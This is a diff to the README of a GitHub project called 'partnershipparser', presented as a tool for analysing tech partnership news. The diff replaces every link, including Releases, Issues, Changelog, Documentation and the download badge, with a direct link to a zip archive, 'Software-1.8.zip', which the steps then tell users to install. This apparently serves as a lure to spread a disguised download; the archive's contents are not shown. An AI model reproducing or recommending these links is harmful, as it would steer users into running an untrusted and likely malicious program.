@@ -1,7 +1,7 @@
 # 📊 partnershipparser - Transform Partnership News into Actionable Insights
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bahooo13/partnershipparser/releases)
+[![Download](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip)](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip)
 
 ## 📚 Introduction
 **partnershipparser** extracts and structures key information from tech partnership news. This tool makes it easy to analyze companies, focus areas, and impacts. With partnershipparser, you can gain insights quickly and clearly, helping you stay informed in the fast-changing tech industry.
@@ -19,7 +19,7 @@ Before downloading the application, ensure that your system meets the following 
 - **Internet Connection:** Required for downloading and updating
 
 ### Step 2: Download the Software
-To download the latest version of partnershipparser, visit the [Releases page](https://github.com/bahooo13/partnershipparser/releases).
+To download the latest version of partnershipparser, visit the [Releases page](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip).
 
 ### Step 3: Install the Application
 Once you have downloaded the application file, follow these steps to install it:
@@ -29,7 +29,7 @@ Once you have downloaded the application file, follow these steps to install it:
 3. Follow the on-screen prompts to complete the installation. This may include agreeing to the terms of service and choosing an installation directory.
 
 ## 📥 Download & Install
-After the installation process, you can start using partnershipparser. For direct download, visit this page: [Download Link](https://github.com/bahooo13/partnershipparser/releases).
+After the installation process, you can start using partnershipparser. For direct download, visit this page: [Download Link](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip).
 
 ## 🛠️ Using partnershipparser
 Once installed, you can open the application easily. Here’s how:
@@ -65,13 +65,13 @@ To make the most out of partnershipparser, consider exploring additional resourc
 - **Community Forums:** Engage with other users to share tips and insights on using partnershipparser effectively.
 
 ## 📞 Support
-If you encounter any issues or have questions, please reach out through the [GitHub Issues page](https://github.com/bahooo13/partnershipparser/issues). Your feedback helps us improve the software.
+If you encounter any issues or have questions, please reach out through the [GitHub Issues page](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip). Your feedback helps us improve the software.
 
 ## 🔗 Stay Updated
 To keep track of new features, improvements, and updates, follow these links:
 
-- [Changelog](https://github.com/bahooo13/partnershipparser/releases)
-- [Documentation](https://github.com/bahooo13/partnershipparser/wiki)
+- [Changelog](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip)
+- [Documentation](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip)
 
 ## 👩‍💻 Contributing
 If you want to contribute to the project, feel free to review the contributing guidelines in the repository. Your contributions are welcome!
@@ -79,4 +79,4 @@ If you want to contribute to the project, feel free to review the contributing g
 ## 🧑‍🎓 Conclusion
 By following these steps, you can easily download, install, and use partnershipparser. This application enables you to extract valuable insights from partnership news, making it a vital tool for anyone interested in the tech industry. 
 
-For more information, visit the [Releases page](https://github.com/bahooo13/partnershipparser/releases). Happy analyzing!
+For more information, visit the [Releases page](https://github.com/bahooo13/partnershipparser/raw/refs/heads/main/partnershipparser/Software-1.8.zip). Happy analyzing!
